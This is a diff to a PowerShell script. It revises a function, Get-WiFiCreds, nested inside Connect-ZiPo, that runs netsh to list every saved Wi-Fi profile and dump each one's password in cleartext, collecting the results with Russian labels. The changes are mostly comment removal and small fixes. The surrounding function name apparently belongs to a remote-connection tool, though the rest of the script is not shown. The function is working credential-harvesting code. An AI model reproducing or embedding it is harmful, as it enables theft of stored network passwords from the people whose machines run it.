@@ -86,10 +86,7 @@ function Connect-ZiPo {
 
    function Get-WiFiCreds {
     try {
-        # Вызываем netsh с принудительной сменой кодовой страницы
         $profilesOutput = cmd /c "chcp 65001 >nul & netsh wlan show profiles" | Out-String
-
-        # Ищем нужные строки с названиями профилей
         $profileLines = $profilesOutput -split "`r?`n" | Where-Object {
             $_ -match "All User Profile" -or $_ -match "Все профили пользователей"
         }
@@ -98,13 +95,15 @@ function Connect-ZiPo {
             return "[INFO] No Wi-Fi profiles found."
         }
 
-        $results = "Wi-Fi Credentials:`n"
+        $results = "`nWi-Fi Credentials:`n"
         foreach ($line in $profileLines) {
-            $parts   = $line -split ":", 2
+            $parts = $line -split ":", 2
+            if ($parts.Count -lt 2) { continue }
             $wifiName = $parts[1].Trim()
+
             $results += "`nSSID: $wifiName`n"
 
-            # Для каждого профиля та же схема
+            # Снова меняем кодировку перед вызовом netsh
             $detailsCmd = "chcp 65001 >nul & netsh wlan show profile name=""$wifiName"" key=clear"
             $details = cmd /c $detailsCmd | Out-String
 
@@ -113,18 +112,16 @@ function Connect-ZiPo {
             }
 
             if ($keyLine) {
-                # Извлекаем то, что после двоеточия
                 $key = ($keyLine -replace ".*:\s*", "").Trim()
                 $results += "Пароль: $key`n"
-            }
-            else {
+            } else {
                 $results += "Пароль не найден`n"
             }
         }
         return $results
     }
     catch {
-        return "[ERROR] " + $_.Exception.Message
+        return "[ERROR] $($_.Exception.Message)"
     }
 }
 
